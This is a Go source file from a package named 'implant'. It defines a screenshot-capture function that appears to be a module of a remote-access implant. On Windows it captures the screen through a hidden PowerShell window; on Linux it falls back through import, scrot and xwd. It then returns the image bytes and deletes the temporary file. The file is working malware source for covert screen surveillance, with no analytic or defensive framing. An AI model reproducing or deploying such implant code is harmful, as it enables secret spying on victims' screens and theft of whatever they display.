package implant

import (
	"fmt"
	"os"
	"path/filepath"
	"runtime"
)

// CaptureScreenshot takes a screenshot and returns the image bytes.
func CaptureScreenshot() ([]byte, error) {
	// Use a path without spaces to avoid shell escaping issues
	outPath := filepath.Join(os.TempDir(), "ss.png")
	if runtime.GOOS == "windows" {
		outPath = `C:\Windows\Temp\ss.png`
	}
	defer os.Remove(outPath)

	var err error
	if runtime.GOOS == "windows" {
		err = screenshotWindows(outPath)
	} else {
		err = screenshotLinux(outPath)
	}

	if err != nil {
		return nil, err
	}

	return os.ReadFile(outPath)
}

// screenshotWindows uses PowerShell to capture the screen.
func screenshotWindows(outPath string) error {
	psScript := `Add-Type -AssemblyName System.Windows.Forms;Add-Type -AssemblyName System.Drawing;$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;$b=New-Object System.Drawing.Bitmap($s.Width,$s.Height);$g=[System.Drawing.Graphics]::FromImage($b);$g.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);$b.Save('` + outPath + `');$g.Dispose();$b.Dispose()`

	_, err := ExecuteShell([]string{"powershell -WindowStyle Hidden -Command " + psScript})
	return err
}

// screenshotLinux uses import (ImageMagick) or scrot as fallback.
func screenshotLinux(outPath string) error {
	// Try import (ImageMagick)
	_, err := ExecuteShell([]string{"import", "-window", "root", outPath})
	if err == nil {
		return nil
	}

	// Try scrot
	_, err = ExecuteShell([]string{"scrot", outPath})
	if err == nil {
		return nil
	}

	// Try xwd + convert
	_, err = ExecuteShell([]string{fmt.Sprintf("xwd -root -silent | convert xwd:- %s", outPath)})
	if err == nil {
		return nil
	}

	return fmt.Errorf("no screenshot tool available (tried: import, scrot, xwd)")
}
